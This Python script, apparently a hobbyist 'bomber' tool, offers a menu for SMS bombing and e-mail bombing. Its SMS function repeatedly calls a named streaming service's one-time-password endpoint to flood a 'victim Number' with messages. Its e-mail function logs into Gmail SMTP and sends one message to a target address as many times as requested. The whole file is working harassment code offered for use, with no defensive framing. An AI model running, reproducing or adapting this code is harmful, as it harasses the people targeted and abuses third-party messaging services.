import os
import sys
import smtplib
import requests
import time

#Color Code
# Bold High Intensty
bred="\033[1;31m"         # Red
bgreen="\033[1;32m"       # Green
byellow="\033[1;33m"      # Yellow
bblue="\033[1;34m"        # Blue
bpurple="\033[1;35m"      # Purple
bcyan="\033[1;36m"        # Cyan
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
color_off="\033[0m"       # Text Reset

logo = ("\033[0;91m"'''
        888888b.   888    d8P          .d88888b.  
        888  "88b  888   d8P          d88P" "Y88b 
        888  .88P  888  d8P           888     888 
        8888888K.  888d88K    888888  888     888 
        888  "Y88b 8888888b   888888  888     888 
        888    888 888  Y88b          888     888 
        888   d88P 888   Y88b         Y88b. .d88P 
        8888888P"  888    Y88b         "Y88888P"  
                                         
                                         
                                         
''')
line = "\n\n=============================================================================================================="+color_off
#SMS Bomber
def smsb():
		logo = bred+'''
		                     
        888888b.   888    d8P        .d8888b.  
        888  "88b  888   d8P        d88P  Y88b 
        888  .88P  888  d8P         Y88b.      
        8888888K.  888d88K    88888  "Y888b.   
        888  "Y88b 8888888b   88888     "Y88b. 
        888    888 888  Y88b              "888 
        888   d88P 888   Y88b       Y88b  d88P 
        8888888P"  888    Y88b       "Y8888P"  '''
		print(logo)

		#Victim's phone number and bombing amount
		number=str(input(byellow+"\n\n\n\nvictim Number: "))
		amount=int(input(byellow+"\nAmount: ")) 
	
	#Bioscope Live TV API
		api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
	
		for i in range(amount):
			requests.get(api)	
		
		time.sleep(30)	#Delivery Time
		print(bgreen+"                   [√] Message Sent Successfully"+color_off)

	#E-mail Bomber	
def emlb():
	logo = (bcyan+'''
                                     
            _____     ____   ___  __   __ ____  
          |  ___)   |  _ \ / _ \|  \ /  |  _ \ 
          | |_ _____| |_) ) | | |   v   | |_) )
          |  _|_____)  _ (| | | | |\_/| |  _ ( 
          | |___    | |_) ) |_| | |   | | |_) )
          |_____)   |____/ \___/|_|   |_|____/ 
                                     
                                     
''')
	print(logo)
	#connect E-mail server
	Log = smtplib.SMTP('smtp.gmail.com','587')
	Log.ehlo()
	Log.starttls()
	
	email = str(input(biyellow+"\nYour E-mail : "+color_off))
	pwd = str(input(byellow+" \nYour Password : "+color_off))
	Tmail = str(input(byellow+"\nTarget mail : "+color_off))
	message = str(input(byellow+"\nMessage : "+color_off))
	Amount = int(input(byellow+"\nAmount : "+color_off))
	
	Log.login(email,pwd)
	
	for i in range(Amount):	
		print(bgreen+"                          ★★★ E-mail Sent ★★★        "+color_off)
		Log.sendmail(email, Tmail, message)

#option selection menu
os.system("clear")
print(logo)
print(bgreen+"               Developed by : Oli Ullah")
print(line)
print(bblue+"\n[>]Selecte Option : \n\n[1]SMS Bombing \n\n[2]E-mail Bombing\n\n[00]Exit")
op = int(input("\n[>]Option No : "))
if op == 1:
	smsb()
elif op ==2:
	emlb()
else:
	print(bred+"wrong value"+color_off)	